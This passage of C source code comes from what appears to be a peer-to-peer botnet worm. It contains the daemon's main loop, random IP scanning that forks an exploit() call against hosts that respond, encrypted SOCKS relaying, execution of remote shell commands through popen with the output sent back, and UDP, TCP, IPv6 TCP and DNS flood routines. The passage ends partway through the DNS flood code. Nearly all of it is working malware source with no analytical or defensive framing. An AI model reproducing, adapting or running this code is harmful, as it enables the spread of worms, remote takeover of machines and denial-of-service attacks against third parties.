initsrv_rec));\n\tinitrec.h.tag=0x70;\n\tinitrec.h.len=0;\n\tinitrec.h.id=0;\n\tcpbases=(unsigned long*)malloc(sizeof(unsigned long)*argc);\n\tif (cpbases == NULL) {\n\t\tprintf(\"Insufficient memory\\n\");\n\t\treturn 0;\n\t}\n\tfor (bases=1;bases<argc;bases++) {\n\t\tcpbases[bases-1]=aresolve(argv[bases]);\n\t\trelay(cpbases[bases-1],(char*)&initrec,sizeof(struct initsrv_rec));\n\t}\n\tnumlinks=0;\n\tdup2(null,0);\n\tdup2(null,1);\n\tdup2(null,2);\n\tif (fork()) return 1;\n#ifdef SCAN\n\ta=classes[rand()%(sizeof classes)];\n\tb=rand();\n\tc=0;\n\td=0;\n#endif\n\tsignal(SIGCHLD,nas);\n\tsignal(SIGHUP,nas);\n\twhile (1) {\n\t\tstatic unsigned long timeout=0,timeout2=0,timeout3=0;\n\t\tchar buf_[3000],*buf=buf_;\n\t\tint n=0,p=0;\n\t\tlong l=0,i=0;\n\t\tunsigned long start=time(NULL);\n\t\tfd_set read;\n\t\tstruct timeval tm;\n\n\t\tFD_ZERO(&read);\n\t\tif (udpserver.sock > 0) FD_SET(udpserver.sock,&read);\n\t\tudpserver.len=0;\n\t\tl=udpserver.sock;\n\t\tfor (n=0;n<(CLIENTS*2);n++) if (clients[n].sock > 0) {\n\t\t\tFD_SET(clients[n].sock,&read);\n\t\t\tclients[n].len=0;\n\t\t\tif (clients[n].sock > l) l=clients[n].sock;\n\t\t}\n\t\tmemset((void*)&tm,0,sizeof(struct timeval));\n\t\ttm.tv_sec=2;\n\t\ttm.tv_usec=0;\n\t\tl=select(l+1,&read,NULL,NULL,&tm);\n\n\t\tif (l == -1) {\n\t\t\tif (errno == EINTR) {\n\t\t\t\tfor (i=0;i<numpids;i++) if (waitpid(pids[i],NULL,WNOHANG) > 0) {\n\t\t\t\t\tunsigned int *newpids,on;\n\t\t\t\t\tfor (on=i+1;on<numpids;on++) pids[on-1]=pids[on];\n\t\t\t\t\tpids[on-1]=0;\n\t\t\t\t\tnumpids--;\n\t\t\t\t\tnewpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));\n\t\t\t\t\tif (newpids != NULL) {\n\t\t\t\t\t\tfor (on=0;on<numpids;on++) newpids[on]=pids[on];\n\t\t\t\t\t\tFREE(pids);\n\t\t\t\t\t\tpids=newpids;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tcontinue;\n\t\t}\n\t\ttimeout+=time(NULL)-start;\n\t\tif (timeout >= 60) {\n\t\t\tif (links == NULL || numlinks == 0) {\n\t\t\t\tmemset((void*)&initrec,0,sizeof(struct initsrv_rec));\n\t\t\t\tinitrec.h.tag=0x70;\n\t\t\t\tinitrec.h.len=0;\n\t\t\t\tinitrec.h.id=0;\n\t\t\t\tfor (i=0;i<bases;i++) relay(cpbases[i],(char*)&initrec,sizeof(struct initsrv_rec));\n\t\t\t}\n\t\t\telse if (!myip) {\n\t\t\t\tmemset((void*)&initrec,0,sizeof(struct initsrv_rec));\n\t\t\t\tinitrec.h.tag=0x74;\n\t\t\t\tinitrec.h.len=0;\n\t\t\t\tinitrec.h.id=0;\n\t\t\t\tsegment(2,(char*)&initrec,sizeof(struct initsrv_rec));\n\t\t\t}\n\t\t\ttimeout=0;\n\t\t}\n\t\ttimeout2+=time(NULL)-start;\n\t\tif (timeout2 >= 3) {\n\t\t\tstruct mqueue *getqueue=queues;\n\t\t\twhile(getqueue != NULL) {\n\t\t\t\tif (time(NULL)-getqueue->time > gettimeout()) {\n\t\t\t\t\tstruct mqueue *l=getqueue->next;\n\t\t\t\t\tdelqueue(getqueue->id);\n\t\t\t\t\tdelqueue(getqueue->id);\n\t\t\t\t\tgetqueue=l;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\telse if ((time(NULL)-getqueue->ltime) >= (getqueue->destination?6:3)) {\n\t\t\t\t\tstruct ainst ts;\n\t\t\t\t\tchar srv[256];\n\t\t\t\t\tunsigned char i;\n\t\t\t\t\tmemset((void*)&ts,0,sizeof(struct ainst));\n\t\t\t\t\tgetqueue->ltime=time(NULL);\n\t\t\t\t\tif (getqueue->destination) {\n\t\t\t\t\t\tconv(srv,256,getqueue->destination);\n\t\t\t\t\t\taudp_relay(&udpserver,&ts,srv,getqueue->port);\n\t\t\t\t\t\taudp_send(&ts,getqueue->packet,getqueue->len);\n\t\t\t\t\t}\n\t\t\t\t\telse for (i=0;i<getqueue->trys;i++) segment(0,getqueue->packet,getqueue->len);\n\t\t\t\t}\n\t\t\t\tgetqueue=getqueue->next;\n\t\t\t}\n\t\t\ttimeout2=0;\n\t\t}\n\t\ttimeout3+=time(NULL)-start;\n\t\tif (timeout3 >= 60*10) {\n\t\t\tchar buf[2]={0,0};\n\t\t\tsyncmode(1);\n\t\t\tbroadcast(buf,1);\n\t\t\ttimeout3=0;\n\t\t}\n\n\t\tif (udpserver.sock > 0 && FD_ISSET(udpserver.sock,&read)) udpserver.len=AREAD;\n\n\t\tfor (n=0;n<(CLIENTS*2);n++) if (clients[n].sock > 0) if (FD_ISSET(clients[n].sock,&read)) clients[n].len=AREAD;\n\n#ifdef SCAN\n\t\tif (myip) for (n=CLIENTS,p=0;n<(CLIENTS*2) && p<100;n++) if (clients[n].sock == 0) {\n\t\t\tchar srv[256];\n\t\t\tif (d == 255) {\n\t\t\t\tif (c == 255) {\n\t\t\t\t\ta=classes[rand()%(sizeof classes)];\n\t\t\t\t\tb=rand();\n\t\t\t\t\tc=0;\n\t\t\t\t}\n\t\t\t\telse c++;\n\t\t\t\td=0;\n\t\t\t}\n\t\t\telse d++;\n\t\t\tmemset(srv,0,256);\n\t\t\tsprintf(srv,\"%d.%d.%d.%d\",a,b,c,d);\n\t\t\tclients[n].ext=time(NULL);\n\t\t\tatcp_sync_connect(&clients[n],srv,SCANPORT);\n\t\t\tp++;\n\t\t}\n\t\tfor (n=CLIENTS;n<(CLIENTS*2);n++) if (clients[n].sock != 0) {\n\t\t\tp=atcp_sync_check(&clients[n]);\n\t\t\tif (p == ASUCCESS || p == ACONNECT || time(NULL)-((unsigned long)clients[n].ext) >= 5) atcp_close(&clients[n]);\n\t\t\tif (p == ASUCCESS) {\n\t\t\t\tchar srv[256];\n\t\t\t\tconv(srv,256,clients[n].in.sin_addr.s_addr);\n\t\t\t\tif (mfork() == 0) {\n\t\t\t\t\texploit(srv);\n\t\t\t\t\texit(0);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n#endif\n\t\tfor (n=0;n<CLIENTS;n++) if (clients[n].sock != 0) {\n\t\t\tif (clients[n].ext2 == TCP_PENDING) {\n\t\t\t\tstruct add_rec rc;\n\t\t\t\tmemset((void*)&rc,0,sizeof(struct add_rec));\n\t\t\t\tp=atcp_sync_check(&clients[n]);\n\t\t\t\tif (p == ACONNECT) {\n\t\t\t\t\trc.h.tag=0x42;\n\t\t\t\t\trc.h.seq=newseq();\n\t\t\t\t\trc.h.id=clients[n].ext3;\n\t\t\t\t\trelayclient(clients[n].ext,(void*)&rc,sizeof(struct add_rec));\n\t\t\t\t\tFREE(clients[n].ext);\n\t\t\t\t\tFREE(clients[n].ext5);\n\t\t\t\t\tatcp_close(&clients[n]);\n\t\t\t\t}\n\t\t\t\tif (p == ASUCCESS) {\n\t\t\t\t\trc.h.tag=0x43;\n\t\t\t\t\trc.h.seq=newseq();\n\t\t\t\t\trc.h.id=clients[n].ext3;\n\t\t\t\t\trelayclient(clients[n].ext,(void*)&rc,sizeof(struct add_rec));\n\t\t\t\t\tclients[n].ext2=TCP_CONNECTED;\n\t\t\t\t\tif (clients[n].ext5) {\n\t\t\t\t\t\tatcp_send(&clients[n],clients[n].ext5,9);\n\t\t\t\t\t\tclients[n].ext2=SOCKS_REPLY;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (clients[n].ext2 == SOCKS_REPLY && clients[n].len != 0) {\n\t\t\t\tstruct add_rec rc;\n\t\t\t\tmemset((void*)&rc,0,sizeof(struct add_rec));\n\t\t\t\tl=atcp_recv(&clients[n],buf,3000);\n\t\t\t\tif (*buf == 0) clients[n].ext2=TCP_CONNECTED;\n\t\t\t\telse {\n\t\t\t\t\trc.h.tag=0x42;\n\t\t\t\t\trc.h.seq=newseq();\n\t\t\t\t\trc.h.id=clients[n].ext3;\n\t\t\t\t\trelayclient(clients[n].ext,(void*)&rc,sizeof(struct add_rec));\n\t\t\t\t\tFREE(clients[n].ext);\n\t\t\t\t\tFREE(clients[n].ext5);\n\t\t\t\t\tatcp_close(&clients[n]);\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (clients[n].ext2 == TCP_CONNECTED && clients[n].len != 0) {\n\t\t\t\tstruct data_rec rc;\n\t\t\t\tmemset((void*)&rc,0,sizeof(struct data_rec));\n\t\t\t\tl=atcp_recv(&clients[n],buf+sizeof(struct data_rec),3000-sizeof(struct data_rec));\n\t\t\t\tif (l == AUNKNOWN) {\n\t\t\t\t\tstruct kill_rec rc;\n\t\t\t\t\tmemset((void*)&rc,0,sizeof(struct kill_rec));\n\t\t\t\t\trc.h.tag=0x42;\n\t\t\t\t\trc.h.seq=newseq();\n\t\t\t\t\trc.h.id=clients[n].ext3;\n\t\t\t\t\trelayclient((struct ainst *)clients[n].ext,(void*)&rc,sizeof(struct kill_rec));\n\t\t\t\t\tFREE(clients[n].ext);\n\t\t\t\t\tFREE(clients[n].ext5);\n\t\t\t\t\tatcp_close(&clients[n]);\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tl=clients[n].len;\n\t\t\t\t\trc.h.tag=0x41;\n\t\t\t\t\trc.h.seq=newseq();\n\t\t\t\t\trc.h.id=clients[n].ext3;\n\t\t\t\t\trc.h.len=l;\n\t\t\t\t\t_encrypt(buf+sizeof(struct data_rec),l);\n\t\t\t\t\tmemcpy(buf,(void*)&rc,sizeof(struct data_rec));\n\t\t\t\t\trelayclient((struct ainst *)clients[n].ext,buf,l+sizeof(struct data_rec));\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tif (udpserver.len != 0) if (!audp_recv(&udpserver,&udpclient,buf,3000)) {\n\t\t\tstruct llheader *llrp, ll;\n\t\t\tstruct header *tmp;\n\t\t\tin++;\n\t\t\tif (udpserver.len < 0 || udpserver.len < sizeof(struct llheader)) continue;\n\t\t\tbuf+=sizeof(struct llheader);\n\t\t\tudpserver.len-=sizeof(struct llheader);\n\t\t\tllrp=(struct llheader *)(buf-sizeof(struct llheader));\n\t\t\ttmp=(struct header *)buf;\n\t\t\tif (llrp->type == 0) {\n\t\t\t\tmemset((void*)&ll,0,sizeof(struct llheader));\n\t\t\t\tif (llrp->checksum != in_cksum(buf,udpserver.len)) continue;\n\t\t\t\tif (!usersa(llrp->id)) addrsa(llrp->id);\n\t\t\t\telse continue;\n\t\t\t\tll.type=1;\n\t\t\t\tll.checksum=0;\n\t\t\t\tll.id=llrp->id;\n\t\t\t\tif (tmp->tag != 0x26) audp_send(&udpclient,(char*)&ll,sizeof(struct llheader));\n\t\t\t}\n\t\t\telse if (llrp->type == 1) {\n\t\t\t\tdelqueue(llrp->id);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\telse continue;\n\t\t\tif (udpserver.len >= sizeof(struct header)) {\n\t\t\t\tswitch(tmp->tag) {\n\t\t\t\t\tcase 0x20: { // Info\n\t\t\t\t\t\tstruct getinfo_rec *rp=(struct getinfo_rec *)buf;\n\t\t\t\t\t\tstruct info_rec rc;\n\t\t\t\t\t\tif (udpserver.len < sizeof(struct getinfo_rec)) break;\n\t\t\t\t\t\tmemset((void*)&rc,0,sizeof(struct info_rec));\n\t\t\t\t\t\trc.h.tag=0x47;\n\t\t\t\t\t\trc.h.id=tmp->id;\n\t\t\t\t\t\trc.h.seq=newseq();\n\t\t\t\t\t\trc.h.len=0;\n#ifdef SCAN\n\t\t\t\t\t\trc.a=a;\n\t\t\t\t\t\trc.b=b;\n\t\t\t\t\t\trc.c=c;\n\t\t\t\t\t\trc.d=d;\n#endif\n\t\t\t\t\t\trc.ip=myip;\n\t\t\t\t\t\trc.uptime=time(NULL)-uptime;\n\t\t\t\t\t\trc.in=in;\n\t\t\t\t\t\trc.out=out;\n\t\t\t\t\t\trc.version=VERSION;\n\t\t\t\t\t\trc.reqtime=rp->time;\n\t\t\t\t\t\trc.reqmtime=rp->mtime;\n\t\t\t\t\t\trelayclient(&udpclient,(char*)&rc,sizeof(struct info_rec));\n\t\t\t\t\t\t} break;\n\t\t\t\t\tcase 0x21: { // Open a bounce\n\t\t\t\t\t\tstruct add_rec *sr=(struct add_rec *)buf;\n\t\t\t\t\t\tif (udpserver.len < sizeof(struct add_rec)) break;\n\t\t\t\t\t\tfor (n=0;n<CLIENTS;n++) if (clients[n].sock == 0) {\n\t\t\t\t\t\t\tchar srv[256];\n\t\t\t\t\t\t\tif (sr->socks == 0) conv(srv,256,sr->server);\n\t\t\t\t\t\t\telse conv(srv,256,sr->socks);\n\t\t\t\t\t\t\tclients[n].ext2=TCP_PENDING;\n\t\t\t\t\t\t\tclients[n].ext3=sr->h.id;\n\t\t\t\t\t\t\tclients[n].ext=(struct ainst*)malloc(sizeof(struct ainst));\n\t\t\t\t\t\t\tif (clients[n].ext == NULL) {\n\t\t\t\t\t\t\t\tclients[n].sock=0;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tmemcpy((void*)clients[n].ext,(void*)&udpclient,sizeof(struct ainst));\n\t\t\t\t\t\t\tif (sr->socks == 0) {\n\t\t\t\t\t\t\t\tclients[n].ext5=NULL;\n\t\t\t\t\t\t\t\tatcp_sync_connect(&clients[n],srv,sr->port);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tclients[n].ext5=(char*)malloc(9);\n\t\t\t\t\t\t\t\tif (clients[n].ext5 == NULL) {\n\t\t\t\t\t\t\t\t\tclients[n].sock=0;\n\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t((char*)clients[n].ext5)[0]=0x04;\n\t\t\t\t\t\t\t\t((char*)clients[n].ext5)[1]=0x01;\n\t\t\t\t\t\t\t\t((char*)clients[n].ext5)[2]=((char*)&sr->port)[1];\n\t\t\t\t\t\t\t\t((char*)clients[n].ext5)[3]=((char*)&sr->port)[0];\n\t\t\t\t\t\t\t\t((char*)clients[n].ext5)[4]=((char*)&sr->server)[0];\n\t\t\t\t\t\t\t\t((char*)clients[n].ext5)[5]=((char*)&sr->server)[1];\n\t\t\t\t\t\t\t\t((char*)clients[n].ext5)[6]=((char*)&sr->server)[2];\n\t\t\t\t\t\t\t\t((char*)clients[n].ext5)[7]=((char*)&sr->server)[3];\n\t\t\t\t\t\t\t\t((char*)clients[n].ext5)[8]=0x00;\n\t\t\t\t\t\t\t\tatcp_sync_connect(&clients[n],srv,1080);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif (sr->bind) abind(&clients[n],sr->bind,0);\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t\t} break;\n\t\t\t\t\tcase 0x22: { // Close a bounce\n\t\t\t\t\t\tstruct kill_rec *sr=(struct kill_rec *)buf;\n\t\t\t\t\t\tif (udpserver.len < sizeof(struct kill_rec)) break;\n\t\t\t\t\t\tfor (n=0;n<CLIENTS;n++) if (clients[n].ext3 == sr->h.id) {\n\t\t\t\t\t\t\tFREE(clients[n].ext);\n\t\t\t\t\t\t\tFREE(clients[n].ext5);\n\t\t\t\t\t\t\tatcp_close(&clients[n]);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t} break;\n\t\t\t\t\tcase 0x23: { // Send a message to a bounce\n\t\t\t\t\t\tstruct data_rec *sr=(struct data_rec *)buf;\n\t\t\t\t\t\tif (udpserver.len < sizeof(struct data_rec)+sr->h.len) break;\n\t\t\t\t\t\tfor (n=0;n<CLIENTS;n++) if (clients[n].ext3 == sr->h.id) {\n\t\t\t\t\t\t\t_decrypt(buf+sizeof(struct data_rec),sr->h.len);\n\t\t\t\t\t\t\tatcp_send(&clients[n],buf+sizeof(struct data_rec),sr->h.len);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t} break;\n#ifndef LARGE_NET\n\t\t\t\t\tcase 0x24: { // Run a command\n\t\t\t\t\t\tFILE *f;\n\t\t\t\t\t\tstruct sh_rec *sr=(struct sh_rec *)buf;\n\t\t\t\t\t\tint id;\n\t\t\t\t\t\tif (udpserver.len < sizeof(struct sh_rec)+sr->h.len || sr->h.len > 2999-sizeof(struct sh_rec)) break;\n\t\t\t\t\t\tid=sr->h.id;\n\t\t\t\t\t\t(buf+sizeof(struct sh_rec))[sr->h.len]=0;\n\t\t\t\t\t\t_decrypt(buf+sizeof(struct sh_rec),sr->h.len);\n\t\t\t\t\t\tf=popen(buf+sizeof(struct sh_rec),\"r\");\n\t\t\t\t\t\tif (f != NULL) {\n\t\t\t\t\t\t\twhile(1) {\n\t\t\t\t\t\t\t\tstruct data_rec rc;\n\t\t\t\t\t\t\t\tchar *str;\n\t\t\t\t\t\t\t\tunsigned long len;\n\t\t\t\t\t\t\t\tmemset(buf,0,3000);\n\t\t\t\t\t\t\t\tfgets(buf,3000,f);\n\t\t\t\t\t\t\t\tif (feof(f)) break;\n\t\t\t\t\t\t\t\tlen=strlen(buf);\n\t\t\t\t\t\t\t\tmemset((void*)&rc,0,sizeof(struct data_rec));\n\t\t\t\t\t\t\t\trc.h.tag=0x41;\n\t\t\t\t\t\t\t\trc.h.seq=newseq();\n\t\t\t\t\t\t\t\trc.h.id=id;\n\t\t\t\t\t\t\t\trc.h.len=len;\n\t\t\t\t\t\t\t\t_encrypt(buf,len);\n\t\t\t\t\t\t\t\tstr=(char*)malloc(sizeof(struct data_rec)+len);\n\t\t\t\t\t\t\t\tif (str == NULL) break;\n\t\t\t\t\t\t\t\tmemcpy((void*)str,(void*)&rc,sizeof(struct data_rec));\n\t\t\t\t\t\t\t\tmemcpy((void*)(str+sizeof(struct data_rec)),buf,len);\n\t\t\t\t\t\t\t\trelayclient(&udpclient,str,sizeof(struct data_rec)+len);\n\t\t\t\t\t\t\t\tFREE(str);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tpclose(f);\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse senderror(&udpclient,id,\"Unable to execute command\");\n\t\t\t\t\t\t} break;\n#endif\n\t\t\t\t\tcase 0x25: {\n\t\t\t\t\t\t} break;\n\t\t\t\t\tcase 0x26: { // Route\n\t\t\t\t\t\tstruct route_rec *rp=(struct route_rec *)buf;\n\t\t\t\t\t\tunsigned long i;\n\t\t\t\t\t\tif (udpserver.len < sizeof(struct route_rec)) break;\n\t\t\t\t\t\tif (!useseq(rp->h.seq)) {\n\t\t\t\t\t\t\taddseq(rp->h.seq);\n\t\t\t\t\t\t\taudp_send(&udpclient,(char*)&ll,sizeof(struct llheader));\n\n\t\t\t\t\t\t\tif (rp->sync == 1 && rp->links != numlinks) {\n\t\t\t\t\t\t\t\tif (time(NULL)-synctime > 60) {\n\t\t\t\t\t\t\t\t\tif (rp->links > numlinks) {\n\t\t\t\t\t\t\t\t\t\tmemset((void*)&initrec,0,sizeof(struct initsrv_rec));\n\t\t\t\t\t\t\t\t\t\tinitrec.h.tag=0x72;\n\t\t\t\t\t\t\t\t\t\tinitrec.h.len=0;\n\t\t\t\t\t\t\t\t\t\tinitrec.h.id=0;\n\t\t\t\t\t\t\t\t\t\trelayclient(&udpclient,(char*)&initrec,sizeof(struct initsrv_rec));\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse syncm(&udpclient,0x71,0);\n\t\t\t\t\t\t\t\t\tsynctime=time(NULL);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif (rp->sync != 3) {\n\t\t\t\t\t\t\t\trp->sync=1;\n\t\t\t\t\t\t\t\trp->links=numlinks;\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\tif (rp->server == -1 || rp->server == 0 || rp->server == myip) relay(inet_addr(\"127.0.0.1\"),buf+sizeof(struct route_rec),rp->h.len-sizeof(struct route_rec));\n\n\t\t\t\t\t\t\tif (rp->server == -1 || rp->server == 0) segment(2,buf,rp->h.len);\n\t\t\t\t\t\t\telse if (rp->server != myip) {\n\t\t\t\t\t\t\t\tif (rp->hops == 0 || rp->hops > 16) relay(rp->server,buf,rp->h.len);\n\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\trp->hops--;\n\t\t\t\t\t\t\t\t\tsegment(2,buf,rp->h.len);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\tfor (i=LINKS;i>0;i--) memcpy((struct route_table*)&routes[i],(struct route_table*)&routes[i-1],sizeof(struct route_table));\n\t\t\t\t\t\t\tmemset((struct route_table*)&routes[0],0,sizeof(struct route_table));\n\t\t\t\t\t\t\troutes[0].id=rp->h.id;\n\t\t\t\t\t\t\troutes[0].ip=udpclient.in.sin_addr.s_addr;\n\t\t\t\t\t\t\troutes[0].port=htons(udpclient.in.sin_port);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t} break;\n\t\t\t\t\tcase 0x27: {\n\t\t\t\t\t\t} break;\n\t\t\t\t\tcase 0x28: { // List\n\t\t\t\t\t\tstruct list_rec *rp=(struct list_rec *)buf;\n\t\t\t\t\t\tif (udpserver.len < sizeof(struct list_rec)) break;\n\t\t\t\t\t\tsyncm(&udpclient,0x46,rp->h.id);\n\t\t\t\t\t\t} break;\n\t\t\t\t\tcase 0x29: { // Udp flood\n\t\t\t\t\t\tint flag=1,fd,i=0;\n\t\t\t\t\t\tchar *str;\n\t\t\t\t\t\tstruct sockaddr_in in;\n\t\t\t\t\t\ttime_t start=time(NULL);\n\t\t\t\t\t\tstruct udp_rec *rp=(struct udp_rec *)buf;\n\t\t\t\t\t\tif (udpserver.len < sizeof(struct udp_rec)) break;\n\t\t\t\t\t\tif (rp->size > 9216) {\n\t\t\t\t\t\t\tsenderror(&udpclient,rp->h.id,\"Size must be less than or equal to 9216\\n\");\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif (!isreal(rp->target)) {\n\t\t\t\t\t\t\tsenderror(&udpclient,rp->h.id,\"Cannot packet local networks\\n\");\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif (waitforqueues()) break;\n\t\t\t\t\t\tstr=(char*)malloc(rp->size);\n\t\t\t\t\t\tif (str == NULL) break;\n\t\t\t\t\t\tfor (i=0;i<rp->size;i++) str[i]=rand();\n\t\t\t\t\t\tmemset((void*)&in,0,sizeof(struct sockaddr_in));\n\t\t\t\t\t\tin.sin_addr.s_addr=rp->target;\n\t\t\t\t\t\tin.sin_family=AF_INET;\n\t\t\t\t\t\tin.sin_port=htons(rp->port);\n\t\t\t\t\t\twhile(1) {\n\t\t\t\t\t\t\tif (rp->port == 0) in.sin_port = rand();\n\t\t\t\t\t\t\tif ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tflag = fcntl(fd, F_GETFL, 0);\n\t\t\t\t\t\t\t\tflag |= O_NONBLOCK;\n\t\t\t\t\t\t\t\tfcntl(fd, F_SETFL, flag);\n\t\t\t\t\t\t\t\tsendto(fd,str,rp->size,0,(struct sockaddr*)&in,sizeof(in));\n\t\t\t\t\t\t\t\tclose(fd);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif (i >= 50) {\n\t\t\t\t\t\t\t\tif (time(NULL) >= start+rp->secs) exit(0);\n\t\t\t\t\t\t\t\ti=0;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\ti++;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tFREE(str);\n\t\t\t\t\t\t} exit(0);\n\t\t\t\t\tcase 0x2A: { // Tcp flood\n\t\t\t\t\t\tint flag=1,fd,i=0;\n\t\t\t\t\t\tstruct sockaddr_in in;\n\t\t\t\t\t\ttime_t start=time(NULL);\n\t\t\t\t\t\tstruct tcp_rec *rp=(struct tcp_rec *)buf;\n\t\t\t\t\t\tif (udpserver.len < sizeof(struct tcp_rec)) break;\n\t\t\t\t\t\tif (!isreal(rp->target)) {\n\t\t\t\t\t\t\tsenderror(&udpclient,rp->h.id,\"Cannot packet local networks\\n\");\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif (waitforqueues()) break;\n\t\t\t\t\t\tmemset((void*)&in,0,sizeof(struct sockaddr_in));\n\t\t\t\t\t\tin.sin_addr.s_addr=rp->target;\n\t\t\t\t\t\tin.sin_family=AF_INET;\n\t\t\t\t\t\tin.sin_port=htons(rp->port);\n\t\t\t\t\t\twhile(1) {\n\t\t\t\t\t\t\tif (rp->port == 0) in.sin_port = rand();\n\t\t\t\t\t\t\tif ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tflag = fcntl(fd, F_GETFL, 0);\n\t\t\t\t\t\t\t\tflag |= O_NONBLOCK;\n\t\t\t\t\t\t\t\tfcntl(fd, F_SETFL, flag);\n\t\t\t\t\t\t\t\tconnect(fd, (struct sockaddr *)&in, sizeof(in));\n\t\t\t\t\t\t\t\tclose(fd);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif (i >= 50) {\n\t\t\t\t\t\t\t\tif (time(NULL) >= start+rp->secs) exit(0);\n\t\t\t\t\t\t\t\ti=0;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\ti++;\n\t\t\t\t\t\t}\n\t\t\t\t\t\t} exit(0);\n#ifndef NOIPV6\n\t\t\t\t\tcase 0x2B: { // IPv6 Tcp flood\n\t\t\t\t\t\tint flag=1,fd,i=0,j=0;\n\t\t\t\t\t\tstruct sockaddr_in6 in;\n\t\t\t\t\t\ttime_t start=time(NULL);\n\t\t\t\t\t\tstruct tcp6_rec *rp=(struct tcp6_rec *)buf;\n\t\t\t\t\t\tif (udpserver.len < sizeof(struct tcp6_rec)) break;\n\t\t\t\t\t\tif (waitforqueues()) break;\n\t\t\t\t\t\tmemset((void*)&in,0,sizeof(struct sockaddr_in6));\n\t\t\t\t\t\tfor (i=0;i<4;i++) for (j=0;j<4;j++) ((char*)&in.sin6_addr.s6_addr[i])[j]=((char*)&rp->target[i])[j];\n\t\t\t\t\t\tin.sin6_family=AF_INET6;\n\t\t\t\t\t\tin.sin6_port=htons(rp->port);\n\t\t\t\t\t\twhile(1) {\n\t\t\t\t\t\t\tif (rp->port == 0) in.sin6_port = rand();\n\t\t\t\t\t\t\tif ((fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP)) < 0);\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tflag = fcntl(fd, F_GETFL, 0);\n\t\t\t\t\t\t\t\tflag |= O_NONBLOCK;\n\t\t\t\t\t\t\t\tfcntl(fd, F_SETFL, flag);\n\t\t\t\t\t\t\t\tconnect(fd, (struct sockaddr *)&in, sizeof(in));\n\t\t\t\t\t\t\t\tclose(fd);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif (i >= 50) {\n\t\t\t\t\t\t\t\tif (time(NULL) >= start+rp->secs) exit(0);\n\t\t\t\t\t\t\t\ti=0;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\ti++;\n\t\t\t\t\t\t}\n\t\t\t\t\t\t} exit(0);\n#endif\n\t\t\t\t\tcase 0x2C: { // Dns flood\n\t\t\t\t\t\tstruct dns {\n\t\t\t\t\t\t\tunsigned short int id;\n\t\t\t\t\t\t\tunsigned char  rd:1;\n\t\t\t\t\t\t\tunsigned char  tc:1;\n\t\t\t\t\t\t\tunsigned char  aa:1;\n\t\t\t\t\t\t\tunsigned char  opcode:4;\n\t\t\t\t\t\t\tunsigned char  qr:1;\n\t\t\t\t\t\t\tunsigned char  rcode:4;\n\t\t\t\t\t\t\tunsigned char  unused:2;\n\t\t\t\t\t\t\tunsigned char  pr:1;\n\t\t\t\t\t\t\tunsigned char  ra:1;\n\t\t\t\t\t\t\tunsigned short int que_num;\n\t\t\t\t\t\t\tunsigned short int rep_num;\n\t\t\t\t\t\t\tunsigned short int num_rr;\n\t\t\t\t\t\t\tunsigned short int num_rrsup;\n\t\t\t\t\t\t\tchar buf[128];\n\t\t\t\t\t\t} dnsp;\n\t\t\t\t\t\tunsigned long len=0,i=0,startm;\n\t\t\t\t\t\tint fd,flag;\n\t\t\t\t\t\tchar *convo;\n\t\t\t\t\t\tstruct sockaddr_in in;\n\t\t\t\t\t\tstruct df_rec *rp=(struct df_rec *)buf;\n\t\t\t\t\t\ttime_t start=time(NULL);\n\t\t\t\t\t\tif (udpserver.len < sizeof(struct df_rec)+rp->h.len || rp->h.len > 2999-sizeof(struct df_rec)) break;\n\t\t\t\t\t\tif (!isreal(rp->target)) {\n\t\t\t\t\t\t\tsenderror(&udpclient,rp->h.id,\"Cannot packet local networks\\n\");\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif (waitforqueues()) break;\n\t\t\t\t\t\tmemset((void*)&in,0,sizeof(struct 